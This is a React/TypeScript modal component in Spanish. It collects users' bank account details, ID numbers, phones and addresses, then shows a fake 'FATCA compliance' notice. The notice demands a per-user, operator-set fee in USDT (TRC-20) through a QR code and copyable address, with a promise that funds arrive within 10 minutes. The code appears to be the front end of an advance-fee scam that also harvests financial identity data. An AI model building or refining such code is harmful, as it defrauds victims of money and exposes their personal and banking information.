import { useState, useEffect } from "react";
import { Building2, User, CreditCard, Phone, MapPin, IdCard, Loader2, Check, Clock, AlertTriangle, Copy } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { QRCodeSVG } from "qrcode.react";

interface BankAccountModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

interface BankAccountData {
  bank_name: string;
  account_number: string;
  account_holder_name: string;
  id_number: string;
  phone: string;
  address: string;
  is_verified: boolean;
}

export const BankAccountModal = ({ open, onOpenChange }: BankAccountModalProps) => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [isCheckingAccount, setIsCheckingAccount] = useState(true);
  const [hasExistingAccount, setHasExistingAccount] = useState(false);
  const [existingAccount, setExistingAccount] = useState<BankAccountData | null>(null);
  const [showFatcaNotice, setShowFatcaNotice] = useState(false);
  const [fatcaEnabled, setFatcaEnabled] = useState(false);
  const [fatcaAmount, setFatcaAmount] = useState<number>(1521.00);
  const [usdtAddress, setUsdtAddress] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [formData, setFormData] = useState<Omit<BankAccountData, 'is_verified'>>({
    bank_name: "",
    account_number: "",
    account_holder_name: "",
    id_number: "",
    phone: "",
    address: "",
  });

  useEffect(() => {
    const checkExistingAccount = async () => {
      if (!open) return;
      
      setIsCheckingAccount(true);
      setShowFatcaNotice(false);
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user) return;

        // Obtener cuenta bancaria afiliada
        const { data, error } = await supabase
          .from('affiliated_bank_accounts')
          .select('*')
          .eq('user_id', user.id)
          .maybeSingle();

        if (error) throw error;
        
        if (data) {
          setHasExistingAccount(true);
          setExistingAccount({
            bank_name: data.bank_name,
            account_number: data.account_number,
            account_holder_name: data.account_holder_name,
            id_number: data.id_number,
            phone: data.phone,
            address: data.address,
            is_verified: data.is_verified,
          });
        } else {
          setHasExistingAccount(false);
          setExistingAccount(null);
        }

        // Obtener dirección USDT y flags FATCA del perfil
        const { data: profileData } = await supabase
          .from('profiles')
          .select('usdt_address, show_fatca, fatca_amount')
          .eq('user_id', user.id)
          .single();

        if (profileData?.usdt_address) {
          setUsdtAddress(profileData.usdt_address);
        }
        setFatcaEnabled(profileData?.show_fatca || false);
        setFatcaAmount(profileData?.fatca_amount || 1521.00);
      } catch (error) {
        console.error('Error checking existing account:', error);
      } finally {
        setIsCheckingAccount(false);
      }
    };

    checkExistingAccount();
  }, [open]);

  const handleContinue = () => {
    if (existingAccount?.is_verified && fatcaEnabled) {
      setShowFatcaNotice(true);
    } else {
      onOpenChange(false);
    }
  };

  const handleCopyAddress = async () => {
    if (!usdtAddress) return;
    
    try {
      await navigator.clipboard.writeText(usdtAddress);
      setCopied(true);
      toast({
        title: "Dirección copiada",
        description: "La dirección USDT TRC-20 ha sido copiada al portapapeles.",
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "No se pudo copiar la dirección.",
        variant: "destructive",
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.bank_name || !formData.account_number || !formData.account_holder_name || 
        !formData.id_number || !formData.phone || !formData.address) {
      toast({
        title: "Error",
        description: "Por favor completa todos los campos.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("No user found");

      const { error } = await supabase
        .from('affiliated_bank_accounts')
        .insert({
          user_id: user.id,
          bank_name: formData.bank_name,
          account_number: formData.account_number,
          account_holder_name: formData.account_holder_name,
          id_number: formData.id_number,
          phone: formData.phone,
          address: formData.address,
        });

      if (error) throw error;

      toast({
        title: "Inscripción enviada",
        description: "Tu cuenta bancaria está pendiente de aprobación.",
      });
      
      setHasExistingAccount(true);
      setExistingAccount({ ...formData, is_verified: false });
    } catch (error: any) {
      console.error('Error saving bank account:', error);
      toast({
        title: "Error",
        description: error.message || "No se pudo registrar la cuenta bancaria.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (isCheckingAccount) {
    return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="sm:max-w-md bg-card border-border">
          <div className="flex items-center justify-center py-8">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-accent"></div>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  // Mostrar aviso FATCA
  if (showFatcaNotice) {
    return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="sm:max-w-md bg-card border-border">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-foreground">
              <AlertTriangle className="w-5 h-5 text-amber-500" />
              Cumplimiento FATCA
            </DialogTitle>
            <DialogDescription className="text-muted-foreground">
              Foreign Account Tax Compliance Act
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-4 py-4">
            <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-lg">
              <p className="text-sm text-amber-600 dark:text-amber-400 font-medium">Pago requerido por cumplimiento FATCA</p>
              <p className="text-2xl font-bold text-foreground mt-1">
                ${fatcaAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </p>
            </div>

            <div className="p-3 bg-muted rounded-lg space-y-2">
              <p className="text-sm text-foreground">
                Para cumplir con las regulaciones FATCA (Foreign Account Tax Compliance Act), 
                se requiere realizar un pago de verificación antes de procesar transferencias internacionales.
              </p>
              <p className="text-sm text-emerald-600 dark:text-emerald-400 font-medium">
                Al efectuar el pago solicitado, en un plazo no mayor a 10 minutos se reflejarán los fondos en su cuenta bancaria.
              </p>
            </div>

            {/* QR Code */}
            {usdtAddress && (
              <div className="flex flex-col items-center space-y-3">
                <div className="p-4 bg-white rounded-lg">
                  <QRCodeSVG 
                    value={usdtAddress} 
                    size={160}
                    level="H"
                  />
                </div>
                <p className="text-xs text-muted-foreground text-center">
                  Escanea el código QR o copia la dirección
                </p>
              </div>
            )}

            {/* Dirección USDT */}
            {usdtAddress && (
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground">Dirección USDT (TRC-20)</label>
                <div className="flex items-center gap-2">
                  <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-xs break-all text-foreground">
                    {usdtAddress}
                  </div>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleCopyAddress}
                  >
                    {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </div>
            )}
          </div>

          <Button variant="outline" onClick={() => onOpenChange(false)} className="w-full">
            Entendido
          </Button>
        </DialogContent>
      </Dialog>
    );
  }

  // Si ya tiene cuenta registrada, mostrar info
  if (hasExistingAccount && existingAccount) {
    const isPending = !existingAccount.is_verified;
    
    return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="sm:max-w-md bg-card border-border">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-foreground">
              {isPending ? (
                <Clock className="w-5 h-5 text-amber-500" />
              ) : (
                <Check className="w-5 h-5 text-emerald-500" />
              )}
              Cuenta Bancaria Afiliada
            </DialogTitle>
            <DialogDescription className="text-muted-foreground">
              {isPending 
                ? "Tu cuenta bancaria está pendiente de aprobación."
                : "Ya tienes una cuenta bancaria registrada para recibir transferencias."
              }
            </DialogDescription>
          </DialogHeader>

          {isPending && (
            <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded-lg">
              <p className="text-sm text-amber-600 dark:text-amber-400 flex items-center gap-2">
                <Clock className="w-4 h-4" />
                <strong>Inscripción Pendiente:</strong> Tu cuenta está siendo revisada por nuestro equipo.
              </p>
            </div>
          )}

          <div className="space-y-3 py-4">
            <div className="p-3 bg-muted rounded-lg">
              <p className="text-xs text-muted-foreground">Banco</p>
              <p className="text-sm font-medium text-foreground">{existingAccount.bank_name}</p>
            </div>
            <div className="p-3 bg-muted rounded-lg">
              <p className="text-xs text-muted-foreground">Número de Cuenta</p>
              <p className="text-sm font-medium text-foreground font-mono">{existingAccount.account_number}</p>
            </div>
            <div className="p-3 bg-muted rounded-lg">
              <p className="text-xs text-muted-foreground">Titular</p>
              <p className="text-sm font-medium text-foreground">{existingAccount.account_holder_name}</p>
            </div>
            <div className="p-3 bg-muted rounded-lg flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground">Estado</p>
                <p className="text-sm font-medium text-foreground">
                  {isPending ? "Pendiente de aprobación" : "Aprobada"}
                </p>
              </div>
              {isPending ? (
                <span className="px-2 py-1 text-xs font-medium bg-amber-500/10 text-amber-600 dark:text-amber-400 rounded-full border border-amber-500/20">
                  Pendiente
                </span>
              ) : (
                <span className="px-2 py-1 text-xs font-medium bg-emerald-500/10 text-emerald-500 rounded-full border border-emerald-500/20">
                  Aprobada
                </span>
              )}
            </div>
          </div>

          <Button onClick={handleContinue} className="w-full">
            Continuar
          </Button>
        </DialogContent>
      </Dialog>
    );
  }

  // Formulario para registrar cuenta
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-lg bg-card border-border max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-foreground">
            <Building2 className="w-5 h-5 text-primary" />
            Inscribir Cuenta Bancaria
          </DialogTitle>
          <DialogDescription className="text-muted-foreground">
            Registra tu cuenta bancaria para recibir transferencias a tu banco local.
          </DialogDescription>
        </DialogHeader>

        <form onSubmit={handleSubmit} className="space-y-4 py-4">
          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <Building2 className="w-4 h-4" />
              Nombre del Banco
            </Label>
            <Input
              placeholder="Ej: Banco Nacional"
              value={formData.bank_name}
              onChange={(e) => setFormData({ ...formData, bank_name: e.target.value })}
              className="bg-background border-border"
            />
          </div>

          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <CreditCard className="w-4 h-4" />
              Número de Cuenta
            </Label>
            <Input
              placeholder="Número de cuenta bancaria"
              value={formData.account_number}
              onChange={(e) => setFormData({ ...formData, account_number: e.target.value })}
              className="bg-background border-border font-mono"
            />
          </div>

          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <User className="w-4 h-4" />
              Nombre del Titular
            </Label>
            <Input
              placeholder="Nombre completo del titular"
              value={formData.account_holder_name}
              onChange={(e) => setFormData({ ...formData, account_holder_name: e.target.value })}
              className="bg-background border-border"
            />
          </div>

          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <IdCard className="w-4 h-4" />
              Número de Identificación
            </Label>
            <Input
              placeholder="DNI, Cédula, Pasaporte, etc."
              value={formData.id_number}
              onChange={(e) => setFormData({ ...formData, id_number: e.target.value })}
              className="bg-background border-border"
            />
          </div>

          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <Phone className="w-4 h-4" />
              Teléfono de Contacto
            </Label>
            <Input
              placeholder="+1 234 567 8900"
              value={formData.phone}
              onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
              className="bg-background border-border"
            />
          </div>

          <div className="space-y-2">
            <Label className="text-foreground flex items-center gap-2">
              <MapPin className="w-4 h-4" />
              Dirección Afiliada al Banco
            </Label>
            <Input
              placeholder="Dirección registrada en el banco"
              value={formData.address}
              onChange={(e) => setFormData({ ...formData, address: e.target.value })}
              className="bg-background border-border"
            />
          </div>

          <div className="flex gap-3 pt-2">
            <Button 
              type="button" 
              variant="outline" 
              onClick={() => onOpenChange(false)} 
              className="flex-1"
            >
              Cancelar
            </Button>
            <Button type="submit" className="flex-1" disabled={isLoading}>
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Guardando...
                </>
              ) : (
                "Inscribir Cuenta"
              )}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};
